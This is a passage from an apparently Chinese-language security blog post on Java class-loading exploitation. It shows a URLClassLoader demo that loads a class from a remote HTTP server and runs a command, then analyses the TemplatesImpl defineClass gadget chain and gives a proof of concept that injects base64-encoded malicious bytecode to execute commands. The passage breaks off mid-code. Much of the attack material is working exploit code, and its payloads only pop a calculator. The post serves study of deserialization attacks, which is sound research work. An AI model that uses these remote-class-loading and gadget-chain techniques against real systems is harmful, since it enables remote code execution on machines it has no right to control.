AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="URLClassLoader加载远程class"><a href="#URLClassLoader加载远程class" class="headerlink" title="URLClassLoader加载远程class"></a>URLClassLoader加载远程class</h3><ol><li><strong>服务器问题</strong>: <code>python -m http.server --bind 127.0.0.1 9999</code>本地文件夹运行python服务器，可以通过<code>127.0.0.1</code>或者 <code>ipconfig</code> 出来的ipv4地址，注意编译class文件的java版本</li><li><strong>远程加载问题</strong>: 部署的要通过URLClassLoader来加载远程服务，由于<strong>双亲委派</strong>模型，导致这里在 loadClass 方法会优先从本地找起，所以需要将编译后的 <code>恶意类.class</code> 放置在项目之外的目录，不然就会找到本地的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLClassLoaderPayload.java   放在加载文件的项目文件外</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">URLClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// URLClassLoaderRCE.java   用于加载远程恶意文件</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.10.126:9999/&quot;</span>);</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">my_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> my_loader.loadClass(<span class="string">&quot;URLClassLoaderPayload&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(<span class="literal">null</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="defineClass-调用链"><a href="#defineClass-调用链" class="headerlink" title="defineClass()调用链"></a>defineClass()调用链</h2><h3 id="细嗦缘由"><a href="#细嗦缘由" class="headerlink" title="细嗦缘由"></a>细嗦缘由</h3><ol><li>通过 defineClass 直接加载字节码时，由于 defineClass 方法的<strong>访问修饰符为 protected</strong>，不得不使用到反射技术才得以利用，这使得 defineClass 在实战利用中没法被直接利用，不过也提到了存在一些间接路线能够对 defineClass 进行间接调用</li><li>这里的间接路线也是类似于java反序列化的链条进行调用的，所以也是调用链</li></ol><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="什么是TemplatesImpl"><a href="#什么是TemplatesImpl" class="headerlink" title="什么是TemplatesImpl?"></a>什么是TemplatesImpl?</h4><blockquote><p>TemplatesImpl 便是间接路线之一<br>TemplatesImpl 在后续的多个反序列化链及实际场景中都会有所体现，如 CommonsCollections2、CommonsCollections3、CommonsCollections4、CommonsBeanutils1、Shiro 反序列化利用和 Fastjson 反序列化利用等</p></blockquote><ol><li><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类的作用是表示 XSLT 模板，它可以解析 XSLT 样式表并将其编译成可重用的模板。XSLT 是一种 XML 风格语言，<strong>用于将 XML 文档转换为其他格式，比如 HTML、文本或其他 XML 文档</strong></p><ol><li>它是 javax.xml.transform.Templates 接口的具体实现</li><li>可以进行序列化</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h4><ol><li><p>调用链式倒推的，首先看到寻找TemplatesImpl中可供defindeClass()方法，在内部静态类<code>TransletClassLoader</code>中</p><ol><li>注意到此处的defineClass()方法的访问属性式default，即可以被同一个包的访问到，这个静态类继承了ClassLoader</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接着找调用defineClas的调用处<code>defineTransdletClasses()</code></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// ...下面不贴了</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>再往上找，<code>getTransletInstance()</code>中有调用，还是private，再往上</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... 略</span></span><br></pre></td></tr></table></figure></li><li><p>终于到一个public的方法，再看看注释</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implements JAXP&#x27;s Templates.newTransformer()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后亮出<strong>Gadget</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li><li><p>还要分析怎么利用才行，show me your poc</p><ol><li><p>先从sink到调用处分析，先看看这两个属性</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the actual class definition for the translet class and</span></span><br><span class="line"><span class="comment"> * any auxiliary classes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the translet class definition(s). These are created when</span></span><br><span class="line"><span class="comment"> * this Templates is created or when it is read back from disk.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code>可以知道只要将恶意类的代码放到<code>_bytecodes[i]</code>即可，会自动加载类代码</p></li><li><p>来到TemplatesImpl#getTransletInstance(): <code>if (_name == null) return null;if (_class == null) defineTransletClasses();</code>这一行中<strong>req1: 要_name不为bull，_class为null</strong></p></li><li><p>来到newTransformer()中，有用到_开头的变量，应该是该类变量，正常调用就会调用链子</p></li><li><p>还是得顺着回去来一遍</p><ol><li><p>newTransformer中 <strong>req2: <code>_tfactory</code>有进行函数调用，没说为nullable</strong> ，不能为null，其他变量先为null问题不大</p></li><li><p>getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>会<strong>对_class进行一次反射调用</strong>，不能为null，<strong>但是要调用到defineTrnasletClasses需要它为null(前面有说过了)</strong></p></li><li><p>defineTransletClasses中发现面这句话，_transletIndex应该不用进行设定，会在这里进行遍历，不过这个反射实例化的类得看一看，<strong>必须是AbstrtactTranslet的子类</strong>，看看构造函数怎么办，搜<code>_class</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>关于<code>_class</code>的设置发现这defineTransletClasses里有，<strong>req4: 所以我们传入的<code>_bytecodes</code>必须是AbstractTranslet的子类</strong></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">_class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br></pre></td></tr></table></figure></li><li><p>触发恶意代码：AbstractTranslet子类会把<code>_class[_transletIndex]</code>进行实例化，写在构造函数里就好了</p></li></ol></li><li><p><em><strong>总结一下要求</strong></em>(关注必须的就ok)</p><ol><li><code>_tfactory</code>不为null –&gt; 其实这里也非强制，虽然没有@Nullable，但是因为比较慢调用，而且动态类型不会编译错误</li><li><code>_name</code>不为null，<code>_class</code>为null</li><li><code>_bytecodes[i]</code>需要时AbstractTranslet的子类，中有恶意类代码</li><li>构造函数是私有的，通过反射进行创建？其实不用，使用公共的构造器就ok了</li></ol></li></ol></li></ol><h4 id="TemplatesImpl-poc"><a href="#TemplatesImpl-poc" class="headerlink" title="TemplatesImpl poc"></a>TemplatesImpl poc</h4><blockquote><ol><li>注意的点<ol><li>这一条Gadget构造时比较特殊的条件是这个_bytecodes这里需要是<code>AbstractTranslet</code>的子类，一开始倒也不用看很细，后面报错&#x2F;调试也可以发现的，关键代码在getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></li><li>调用点在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>，发现这里其实只要抓住_bytecodes[i]就好</li></ol></li><li>总的来说，找条件时要细心一点，链子poc重点在于：调用链，触发点</li></ol></blockquote><ol><li>最终虽然会报错但是也会成功弹出来calc，利用成功</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImplPayload.java 我的恶意类，在构造函数中执行命令即可，内部会有newInstance()</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImplRCE.java</span></span><br><span class="line">    <span class="comment">// poc触发，最终payload其实是triggerObj这个对象，在通过newTransformer方法触发链子</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplRCE</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 获取Templ...对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射构造调用条件 * * * * * */</span></span><br><span class="line">            <span class="comment">// 0. payload: javac TemplatesImpPayload.java &amp;&amp; cat TemplatesImplRCE.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 设置_name</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_name&quot;</span>, <span 